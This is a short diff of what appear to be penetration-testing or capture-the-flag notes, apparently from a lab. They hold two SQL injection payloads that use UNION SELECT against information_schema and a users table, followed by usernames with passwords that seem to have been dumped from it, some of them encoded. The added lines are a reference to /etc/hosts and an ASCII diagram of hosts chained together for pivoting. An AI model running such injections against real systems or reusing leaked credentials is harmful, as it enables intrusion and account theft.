@@ -1,3 +1,4 @@
+- /etc/hosts
 
 
 product=7 UNION SELECT table_name,1,column_name FROM information_schema.columns
@@ -7,3 +8,26 @@ product=7 UNION SELECT * FROM users
      - user2 - RntyrfVfNER78
      - user3 - Obo4GURRnccyrf
      - Lroth - anotherpassword4THEages
+
++---------+
+|         | .20
+|         |
++---------+  
+     |
+     V
++---------+
+|         |  .181
+|         |
++---------+
+     |
+     V
++---------+
+|         | .xx
+|         |
++---------+
+    |
+    V
++---------+  
+|         |
+|         |
++---------+
